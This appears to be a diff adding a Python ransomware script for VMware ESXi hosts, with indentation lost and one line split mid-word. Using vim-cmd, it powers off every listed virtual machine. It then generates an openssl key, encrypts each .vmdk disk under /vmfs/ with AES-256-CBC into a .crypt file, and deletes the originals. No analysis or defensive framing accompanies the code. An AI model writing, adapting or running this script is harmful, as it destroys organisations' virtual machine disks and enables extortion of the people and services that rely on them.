@@ -1,0 +1,71 @@
+import os
+import subprocess
+
+def run_command(cmd):
+try:
+subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
+except subprocess.CalledProcessError as e:
+print(f"Error: {e.stderr}")
+raise
+
+
+
+vm_list_file = "vm.txt"
+vmdk_list_file = "vmdk.txt"
+key_file = "key.bin"
+
+if not os.path.isfile(vm_list_file):
+try:
+run_command(f"vim-cmd vmsvc/getallms | awk '$1 ~ /^[0-9]+$/{{print $13}}' > {vm_list_file}") 
+except Exception as e:
+print(f"Error getting VM list: {e}")
+exit(1)
+
+try:
+with open(vm_list_file, 'r') as f_vms:
+for vm_id in f_vms:
+vm_id = vm_id.strip()
+try:
+run_command(f"vim-cmd vmsvc/power.off {vm_id}")
+print(f"Powered off VM: {vm_id}")
+except Exception as e:
+print(f"Error powering off VM {vm_id}: {e}") 
+except FileNotFoundError:
+print(f"Error: {vm_list_file} not found.")
+exit(1)
+
+try:
+run_command(f"openssl rand -base64 1024 > {key_file}") 
+except Exception as e:
+print(f"Error generating encryption key: {e}")
+exit(1)
+
+try:
+run_command(f"find /vmfs/ -name '*.vmdk' > {vmdk_list_file}")
+except Exception as e:
+print(f"Error finding VMDK files: {e}")
+exit(1)
+
+try:
+with open(vmdk_list_file, 'r') as f_vmdk:
+for line in f_vmdk:
+vmdk_path = line.strip()
+base, _ = os.path.splitext(vmdk_path)
+encrypted_path = f"{base}.crypt"
+
+encrypt_cmd = f"openssl enc -aes-256-cbc -md sha256 -salt -in '{vmdk_path}' -out '{encr
+ypted_path}' -pass file:{key_file}"
+print(f"Encrypting: {encrypt_cmd}")
+run_command(encrypt_cmd)
+
+try:
+os.remove(vmdk_path) 
+print(f"Removed original VMDK: {vmdk_path}")
+except Exception as e:
+print(f"Error deleting VMDK {vmdk_path}: {e}")
+
+except FileNotFoundError:
+print(f"Error: {vmdk_list_file} not found.")
+exit(1)
+
+print("Encryption complete.")
